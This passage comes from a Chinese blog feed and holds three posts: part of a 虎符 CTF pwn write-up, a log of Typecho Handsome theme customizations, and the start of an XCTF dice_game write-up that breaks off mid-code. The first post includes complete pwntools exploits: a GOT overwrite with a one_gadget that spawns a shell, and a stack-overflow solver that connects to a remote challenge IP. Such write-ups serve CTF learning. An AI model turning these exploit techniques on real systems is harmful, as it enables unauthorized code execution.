class="line">    ↓</span><br><span class="line">   0x7f37fa146d40                                    push   qword ptr [rip + 0x2022c2] &lt;0x7f37fa349008&gt;</span><br><span class="line">   0x7f37fa146d46                                    jmp    qword ptr [rip + 0x2022c4] &lt;0x7f37fa361750&gt;</span><br></pre></td></tr></table></figure><p>你也可以这样查 got.plt 中跳转的地址：</p><p>[collapse title=”展开查看详情” status=”false”]首先还是一样需要<code>step</code>单步到_dlerror_run+96 ，就得到 plt 地址：0x7f37fa146d90。然后使用命令<code>disass 0x7f37fa146d90</code>，反编译 plt 函数看看里面命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> disass 0x7f37fa146d90</span></span><br><span class="line">Dump of assembler code for function _dl_catch_error@plt:</span><br><span class="line">   0x00007f37fa146d90 &lt;+0&gt;:jmp    QWORD PTR [rip+0x2022a2]        # 0x7f37fa349038 &lt;_dl_catch_error@got.plt&gt;</span><br><span class="line">   0x00007f37fa146d96 &lt;+6&gt;:push   0x4</span><br><span class="line">   0x00007f37fa146d9b &lt;+11&gt;:jmp    0x7f37fa146d40</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>当中的第一行就是 got.plt 地址，然后查一下里面的值就是函数地址或返回 plt ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> x /gx 0x7f37fa349038</span></span><br><span class="line">0x7f37fa349038 &lt;_dl_catch_error@got.plt&gt;:0x00007f37fa146d96</span><br></pre></td></tr></table></figure><p><code>pdisass</code> 命令好像也是可以的，但好似有时会直接返回函数 libc 地址，有时又返回 plt 操作。查了一下<code>disass</code>是反编译输出，<code>pdisass</code>是带颜色和格式输出：（大雾.png）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> pdisass 0x7f37fa146d90</span></span><br><span class="line"> ► 0x7f37fa146d90 &lt;_dl_catch_error@plt&gt;       jmp    qword ptr [rip + 0x2022a2] &lt;0x7f37fa349038&gt;</span><br><span class="line"> </span><br><span class="line">   0x7f37fa146d96 &lt;_dl_catch_error@plt+6&gt;     push   4</span><br><span class="line">   0x7f37fa146d9b &lt;_dl_catch_error@plt+11&gt;    jmp    0x7f37fa146d40</span><br></pre></td></tr></table></figure><p>[/collapse]</p><p>为什么跳转地址是回到 plt ？</p><p>[collapse title=”展开查看详情” status=”false”]这个函数之前没有调用过，got 表没有记录，所以让 plt 出发<strong>链接器</strong>去找地址。</p><p>GOT 与 PLT 关系可以看<a href="https://www.jianshu.com/p/5092d6d5caa3">这里</a></p><p>[/collapse]</p><p>反正不管它跳转那里只要符合要求，就是跳转地址前缀是<code>0x00007f9648</code>就行。</p><p>所以最后应该向 <code>0x7f37fa349038</code> 写入，写入前的值为：<code>0x00007f37fa146d96</code>，写入后的值为：<code>0x00007f96482c569f</code>。</p><p>程序开了 PIE ，所以算下偏移：<code>0x7f37fa349038</code>-<code>0x7f37f9d55000</code>=<code>0x5f4038</code>。</p><h3 id="完整EXP"><a href="#完整EXP" class="headerlink" title="完整EXP"></a>完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = process(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./chall&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment">#libc = ELF(&quot;./libc.so.6&quot;)</span></span><br><span class="line"></span><br><span class="line">onegadget_offset = <span class="number">0xe569f</span></span><br><span class="line">write_add_offset = <span class="number">0x5f4038</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;I placed the target near: &quot;</span>)</span><br><span class="line">puts_leak = <span class="built_in">int</span>(p.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.info(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"><span class="comment">#malloc = libc_base + libc.symbols[&#x27;__malloc_hook&#x27;]</span></span><br><span class="line"><span class="comment">#log.info(&quot;malloc:&quot;+hex(malloc))</span></span><br><span class="line">onegadget = onegadget_offset + libc_base</span><br><span class="line">log.info(<span class="string">&quot;onegadet:&quot;</span>+<span class="built_in">hex</span>(onegadget))</span><br><span class="line">write_addr = write_add_offset + libc_base</span><br><span class="line">log.info(<span class="string">&quot;write_addr:&quot;</span>+<span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;shoot!shoot!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#p.sendline(str(malloc))</span></span><br><span class="line">p.sendline(<span class="built_in">str</span>(write_addr))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;biang!\n&#x27;</span>)</span><br><span class="line">p.sendline(p8(onegadget&amp;<span class="number">0xff</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;biang!\n&#x27;</span>)</span><br><span class="line">p.sendline(p8((onegadget&gt;&gt;<span class="number">8</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line">p.recvuntil(<span class="string">&#x27;biang!\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b *$rebase(0xd63)&#x27;)</span></span><br><span class="line">p.sendline(p8((onegadget&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="Count"><a href="#Count" class="headerlink" title="Count"></a>Count</h2><p>算术题200道，之后通过栈溢出覆盖栈上变量为 256 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;39.97.210.182&#x27;</span>,<span class="number">40285</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(i &lt; <span class="number">200</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;there have 200 levels ~Math: &quot;</span>)</span><br><span class="line">anw = p.recvuntil(<span class="string">&quot; = ???input answer:&quot;</span>,drop=<span class="number">1</span>).split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line">anw = <span class="built_in">int</span>(anw[<span class="number">0</span>])*<span class="built_in">int</span>(anw[<span class="number">2</span>])+<span class="built_in">int</span>(anw[<span class="number">4</span>])+<span class="built_in">int</span>(anw[<span class="number">6</span>])</span><br><span class="line">p.sendline(<span class="built_in">str</span>(anw))</span><br><span class="line">i+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">100</span>+p64(<span class="number">0x12235612</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;get it&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 虎符ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typecho Handsome6.0 美化修改记录</title>
      <link href="archives/60f30554/"/>
      <url>archives/60f30554/</url>
      
        <content type="html"><![CDATA[<p>记录一下 typecho handsome 修改，以免手滑出事。</p><h2 id="萌卜兔前后台美化插件"><a href="#萌卜兔前后台美化插件" class="headerlink" title="萌卜兔前后台美化插件"></a>萌卜兔前后台美化插件</h2><p>[collapse title=”展开查看详情” status=”false”]</p><h3 id="自带功能"><a href="#自带功能" class="headerlink" title="自带功能"></a>自带功能</h3><ul><li>动态背景</li><li>页面背景透明</li><li>主题盒子优化等效果</li><li>头像旋转</li><li>彩色图标（右侧列表导航栏图标、博客信息标签）</li><li>文章选择卡（首页文章图片获取焦点放大、文章列表获取焦点放大）</li><li>文章卡阴影化</li><li>顶部彩色跑马灯</li><li>文章内打赏处插入打赏图片</li><li>文章内打赏图标跳动</li><li>标题居中</li><li>滚动条美化</li><li>文章标题美化</li><li>彩色标签云</li><li>评论框打字粒子特效</li><li>动态标题</li><li>回到顶部</li><li>看板娘</li><li>鼠标样式</li><li>遮罩特效（网站下雪）</li><li>（自动）夜间模式</li><li>登录壁纸、登录框美化</li></ul><p>插件来自<a href="http://racns.com/index.php/374.html">@萌卜兔</a>，安装配置方法请看作者 blog 。</p><h3 id="我遇到的问题"><a href="#我遇到的问题" class="headerlink" title="我遇到的问题"></a>我遇到的问题</h3><p>如果发现<code>彩色标签云</code>需要刷新页面才可以显示，需要在 <code>handsome主题设置-PJAX-PJAX 回调函数</code>中添加以下代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> tags=<span class="built_in">document</span>.querySelectorAll(<span class="string">&quot;#tag_cloud-2 a,.list-group-item .pull-right&quot;</span>);<span class="keyword">let</span> colorArr=[<span class="string">&quot;#428BCA&quot;</span>,<span class="string">&quot;#AEDCAE&quot;</span>,<span class="string">&quot;#ECA9A7&quot;</span>,<span class="string">&quot;#DA99FF&quot;</span>,<span class="string">&quot;#FFB380&quot;</span>,<span class="string">&quot;#D9B999&quot;</span>];tags.forEach(<span class="function"><span class="params">tag</span>=&gt;</span>&#123;tagsColor=colorArr[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*colorArr.length)];tag.style.backgroundColor=tagsColor&#125;);</span><br></pre></td></tr></table></figure><p>更多详情请看作者博客<a href="http://racns.com/index.php/374.html">@萌卜兔</a>。</p><p>[/collapse]</p><h2 id="xcnte-代码高亮插件"><a href="#xcnte-代码高亮插件" class="headerlink" title="xcnte 代码高亮插件"></a>xcnte 代码高亮插件</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p>实现 Mac 样式的代码高亮插件，会与 handsome 主题代码高亮冲突，需要修改 handsome.min.css 适配。</p><p>具体安装以及修改方法请看作者博客 <a href="https://www.xcnte.com/archives/523/">xcnte</a> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">print(<span class="string">&quot;hello world~&quot;</span>)</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="一言居中-删除网站名称"><a href="#一言居中-删除网站名称" class="headerlink" title="一言居中 删除网站名称"></a>一言居中 删除网站名称</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p>实现效果请看<a href="https://www.mrskye.cn/">首页</a>顶部。</p><p>删除<code>index.php</code>约33行的以下代码</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1 class=&quot;m-n font-thin h3 text-black l-h&quot;&gt;&lt;?php $this-&gt;options-&gt;title(); ?&gt;&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>前往 handsome 设置打开一言，调用的是一言官方接口。</p><p>[/collapse]</p><h2 id="复制成功弹窗"><a href="#复制成功弹窗" class="headerlink" title="复制成功弹窗"></a>复制成功弹窗</h2><p>[collapse title=”展开查看详情” status=”false”]</p><h3 id="自定义JavaScript"><a href="#自定义JavaScript" class="headerlink" title="自定义JavaScript"></a>自定义JavaScript</h3><p>handsome 设置 ==》 自定义 JavaScript 填入：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.oncopy = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;Swal.fire(&#123;<span class="attr">allowOutsideClick</span>:<span class="literal">false</span>,<span class="attr">type</span>:<span class="string">&#x27;success&#x27;</span>,<span class="attr">title</span>: <span class="string">&#x27;复制成功,如转载请注明出处！&#x27;</span>,<span class="attr">showConfirmButton</span>: <span class="literal">false</span>,<span class="attr">timer</span>: <span class="number">2000</span>&#125;);&#125;;</span><br></pre></td></tr></table></figure><h3 id="自定义输出body-尾部的HTML代码"><a href="#自定义输出body-尾部的HTML代码" class="headerlink" title="自定义输出body 尾部的HTML代码"></a>自定义输出body 尾部的HTML代码</h3><p>handsome 设置 ==》 自定义输出body 尾部的HTML代码 填入：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/sweetalert2@8&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="组成栏添加选项"><a href="#组成栏添加选项" class="headerlink" title="组成栏添加选项"></a>组成栏添加选项</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p>修改文件<code>usr/themes/handsome/component/aside.php</code> 。</p><p>模仿修改即可。</p><p>[/collapse]</p><h2 id="一键评论打卡功能"><a href="#一键评论打卡功能" class="headerlink" title="一键评论打卡功能"></a>一键评论打卡功能</h2><p>[collapse title=”展开查看详情” status=”false”]</p><h3 id="添加自定义JavaScript"><a href="#添加自定义JavaScript" class="headerlink" title="添加自定义JavaScript"></a>添加自定义JavaScript</h3><p>首先在<code>后台</code>–&gt;<code>handsome 设置外观</code>–&gt;<code>开发者设置</code>–&gt;<code>自定义JavaScript</code>加入以下代码:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">addNumber</span>(<span class="params">a</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> length = <span class="built_in">document</span>.getElementById(<span class="string">&quot;comment&quot;</span>).value.length;</span><br><span class="line">    <span class="keyword">if</span>(length&gt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;comment&quot;</span>).focus()</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;comment&quot;</span>).value += <span class="string">&#x27;\n&#x27;</span> + a + <span class="keyword">new</span> <span class="built_in">Date</span></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;comment&quot;</span>).focus()</span><br><span class="line">        <span class="built_in">document</span>.getElementById(<span class="string">&quot;comment&quot;</span>).value += a + <span class="keyword">new</span> <span class="built_in">Date</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="修改主题评论文件"><a href="#修改主题评论文件" class="headerlink" title="修改主题评论文件"></a>修改主题评论文件</h3><p>handsome 目录的<code>component/comments.php</code>里面的<code>126</code>行到<code>141</code>行：</p><p><img src="https://mrskye.cn-gd.ufileos.com/img/2020-04-27-vZazqqDmyZS5mUmc.png"></p><p>替换为下面代码：（也就是将原来整一个 <code>&lt;div class=&quot;comment-form-comment form-group&quot;&gt;</code>标签替换为下面的）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;div class&#x3D;&quot;comment-form-comment form-group&quot;&gt;</span><br><span class="line">    &lt;label for&#x3D;&quot;comment&quot;&gt;&lt;?php _me(&quot;评论&quot;) ?&gt; &lt;span class&#x3D;&quot;required text-danger&quot;&gt;（请使用真实邮箱地址，方便接收评论回复）&lt;&#x2F;span&gt;</span><br><span class="line">        &lt;span class&#x3D;&quot;required text-danger&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;label&gt;</span><br><span class="line">    &lt;textarea id&#x3D;&quot;comment&quot; class&#x3D;&quot;textarea form-control OwO-textarea&quot; name&#x3D;&quot;text&quot; rows&#x3D;&quot;5&quot; placeholder&#x3D;&quot;&lt;?php _me(&quot;说点什么吧……&quot;) ?&gt;&quot; onkeydown&#x3D;&quot;if(event.ctrlKey&amp;&amp;event.keyCode&#x3D;&#x3D;13)&#123;document.getElementById(&#39;submit&#39;).click();return false&#125;;&quot;&gt;&lt;?php $this-&gt;remember(&#39;text&#39;); ?&gt;&lt;&#x2F;textarea&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;OwO&quot; style&#x3D;&quot;display: inline;&quot;&gt;&lt;&#x2F;div&gt;&lt;div class&#x3D;&quot;OwO&quot; style&#x3D;&quot;display: inline;&quot;&gt;&lt;a href&#x3D;&quot;javascript:addNumber(&#39;滴！访客卡！请上车的乘客系好安全带，现在是：&#39;)&quot; class&#x3D;&quot;OwO-logo&quot;&gt;&lt;i class&#x3D;&quot;fontello fontello-user face&quot;&gt;&lt;&#x2F;i&gt;&lt;span class&#x3D;&quot;OwOlogotext&quot;&gt;打卡&lt;&#x2F;span&gt;&lt;&#x2F;a&gt;&lt;&#x2F;div&gt;</span><br><span class="line">    &lt;div class&#x3D;&quot;secret_comment&quot; id&#x3D;&quot;secret_comment&quot; data-toggle&#x3D;&quot;tooltip&quot;</span><br><span class="line">    data-original-title&#x3D;&quot;&lt;?php _me(&quot;开启该功能，您的评论仅作者和评论双方可见&quot;) ?&gt;&quot;&gt;</span><br><span class="line">        &lt;label class&#x3D;&quot;secret_comment_label control-label&quot;&gt;&lt;?php _me(&quot;私密评论&quot;) ?&gt;&lt;&#x2F;label&gt;</span><br><span class="line">        &lt;div class&#x3D;&quot;secret_comment_check&quot;&gt;</span><br><span class="line">            &lt;label class&#x3D;&quot;i-switch i-switch-sm bg-dark m-b-ss m-r&quot;&gt;</span><br><span class="line">                &lt;input type&#x3D;&quot;checkbox&quot; id&#x3D;&quot;secret_comment_checkbox&quot;&gt;</span><br><span class="line">                &lt;i&gt;&lt;&#x2F;i&gt;</span><br><span class="line">            &lt;&#x2F;label&gt;</span><br><span class="line">        &lt;&#x2F;div&gt;</span><br><span class="line">    &lt;&#x2F;div&gt;</span><br><span class="line">&lt;&#x2F;div&gt;</span><br></pre></td></tr></table></figure><h3 id="添加自定义css"><a href="#添加自定义css" class="headerlink" title="添加自定义css"></a>添加自定义css</h3><p>在<code>后台</code>–&gt;<code>handsome 设置外观</code>–&gt;<code>开发者设置</code>–&gt;<code>自定义CSS</code>加入以下代码:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.secret_comment</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">5px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.OwO</span><span class="selector-class">.OwO-open</span> <span class="selector-class">.OwO-body</span> &#123;</span><br><span class="line">    <span class="attribute">display</span>:table</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="评论邮件通知"><a href="#评论邮件通知" class="headerlink" title="评论邮件通知"></a>评论邮件通知</h2><p>[collapse title=”展开查看详情” status=”false”]</p><p>作者博客：<a href="https://www.lovekk.org/120.html%EF%BC%88%E5%B7%B2%E6%8C%82%EF%BC%89">https://www.lovekk.org/120.html（已挂）</a></p><p>项目地址：<a href="https://github.com/ylqjgm/LoveKKComment">https://github.com/ylqjgm/LoveKKComment</a></p><p>支持<code>SMTP</code>、<code>Send Cloud</code>、<code>阿里云邮件推送</code>三种邮件通知方式。</p><p>在<del>评论审核通过</del>、用户评论文章、用户评论被回复时对不同场景进行不同的邮件通知。评论审核通过无法检索评论邮箱，导致无法发信，详情请看项目 issue 区。</p><blockquote><p>以下内容修改自：<a href="http://www.xcnte.com/">www.xcnte.com</a></p></blockquote><h3 id="安装方法"><a href="#安装方法" class="headerlink" title="安装方法"></a>安装方法</h3><ol><li>下载最新版本插件</li><li>将下载的压缩包进行解压并上传至Typecho插件目录中，注意目录名称更改为<code>LoveKKComment</code></li><li>后台激活插件</li><li>根据自己的实际情况选择邮件发送接口方式</li><li>根据所选的邮件发送接口，配置相应接口参数</li></ol><h3 id="自定义模板说明"><a href="#自定义模板说明" class="headerlink" title="自定义模板说明"></a>自定义模板说明</h3><p>插件共有三个模板，保存在插件<code>theme</code>目录下，分别为：</p><p><code>approved.html</code>：邮件审核通过通知模板</p><p><code>author.html</code>：文章评论通知作者模板</p><p><code>reply.html</code>：评论回复通知被回复者模板</p><p>三个模板使用变量作为内容替换，您只需在自己的模板中增加相应的模板变量即可，模板变量列表如下：</p><h4 id="approved-html"><a href="#approved-html" class="headerlink" title="approved.html"></a>approved.html</h4><ol><li><code>&#123;blogUrl&#125;</code>：博客地址</li><li><code>&#123;blogName&#125;</code>：博客名称</li><li><code>&#123;author&#125;</code>：评论者名称</li><li><code>&#123;permalink&#125;</code>：文章链接</li><li><code>&#123;title&#125;</code>：文章标题</li><li><code>&#123;text&#125;</code>：评论内容</li></ol><h4 id="author-html"><a href="#author-html" class="headerlink" title="author.html"></a>author.html</h4><p><code>author.html</code>内变量与<code>approved.html</code>内变量一致。</p><h4 id="reply-html"><a href="#reply-html" class="headerlink" title="reply.html"></a>reply.html</h4><ol><li><code>&#123;blogUrl&#125;</code>：博客地址</li><li><code>&#123;blogName&#125;</code>：博客名称</li><li><code>&#123;author&#125;</code>：被回复者名称</li><li><code>&#123;permalink&#125;</code>：文章链接</li><li><code>&#123;title&#125;</code>：文章标题</li><li><code>&#123;text&#125;</code>：被回复者评论内容</li><li><code>&#123;replyAuthor&#125;</code>：回复者名称</li><li><code>&#123;replyText&#125;</code>：回复内容</li></ol><h2 id="handsome-主题文件修改索引"><a href="#handsome-主题文件修改索引" class="headerlink" title="handsome 主题文件修改索引"></a>handsome 主题文件修改索引</h2><p>[collapse title=”展开查看详情” status=”false”]</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">component&#x2F;aside.php        左边导航栏</span><br><span class="line">component&#x2F;comments.php     评论区</span><br><span class="line">component&#x2F;footer.php       底部版权、音乐播放器之类</span><br><span class="line">component&#x2F;header.php       页面头，没啥要改的</span><br><span class="line">component&#x2F;headnav.php      顶部导航</span><br><span class="line">component&#x2F;say.php          时光机动态</span><br><span class="line">component&#x2F;sidebar.php      右侧栏目</span><br><span class="line">component&#x2F;third_party_comments.php    3.3.0新增，第三方评论</span><br><span class="line">css&#x2F;        博客CSS，一般不要改</span><br><span class="line">fonts&#x2F;      博客字体，一般不要改</span><br><span class="line">img&#x2F;        图像，一般不要改</span><br><span class="line">js&#x2F;         js文件，一般不要改</span><br><span class="line">lang&#x2F;       语言文件</span><br><span class="line">libs&#x2F;Content.php    文章内容</span><br><span class="line">libs&#x2F;...    一般不要改</span><br><span class="line">usr&#x2F;        另一个语言文件？</span><br><span class="line">404.php     404界面</span><br><span class="line">archive.php    整合</span><br><span class="line">booklist.php   书单</span><br><span class="line">cross.php      时光机</span><br><span class="line">files.php      归档</span><br><span class="line">functions.php  配置界面的东西</span><br><span class="line">guestbook.php  留言板</span><br><span class="line">index.php      首页</span><br><span class="line">links.php      友链</span><br><span class="line">page.php       文章页面整合</span><br><span class="line">post.php       文章输出</span><br></pre></td></tr></table></figure><p>[/collapse]</p><h2 id="添加加载耗时和浏览人数"><a href="#添加加载耗时和浏览人数" class="headerlink" title="添加加载耗时和浏览人数"></a>添加加载耗时和浏览人数</h2><p>[collapse title=”展开查看详情” status=”false”]<br><a href="https://sunpma.com/536.html">https://sunpma.com/536.html</a><br>[/collapse]</p>]]></content>
      
      
      <categories>
          
          <category> Typecho </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Handsome </tag>
            
            <tag> 美化 </tag>
            
            <tag> typecho </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界做题记录</title>
      <link href="archives/20e728e/"/>
      <url>archives/20e728e/</url>
      
        <content type="html"><![CDATA[<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h3><blockquote><p>题目来源： XCTF 4th-QCTF-2018</p></blockquote><p><strong>考点：栈溢出、混合编程</strong></p><h4 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h4><p>程序实现的是一个具有用户姓名输入的菜随机数程序。</p><h5 id="保护措施"><a href="#保护措施" class="headerlink" title="保护措施"></a>保护措施</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br><span class="line">````</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#### 栈溢出</span></span></span><br><span class="line"></span><br><span class="line">一开始我在纠结是输入数字时使用的是**短整型**，可不可能是整型溢出，这样既能保持低位数字符合要求，又能控制 rip 跳转到后门。一时想不起来是那一条题和这条很相似的，就这样怀疑。</span><br><span class="line"></span><br><span class="line">最后观察是这里存在栈溢出：</span><br><span class="line"></span><br><span class="line">```c</span><br><span class="line">__int64 __fastcall main(__int64 a1, char **a2, char **a3)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[55]; // [rsp+0h] [rbp-50h]</span><br><span class="line">  char v5; // [rsp+37h] [rbp-19h]</span><br><span class="line">  ssize_t v6; // [rsp+38h] [rbp-18h]</span><br><span class="line">  unsigned int seed[2]; // [rsp+40h] [rbp-10h]</span><br><span class="line">  unsigned int v8; // [rsp+4Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  memset(buf, 0, 0x30uLL);</span><br><span 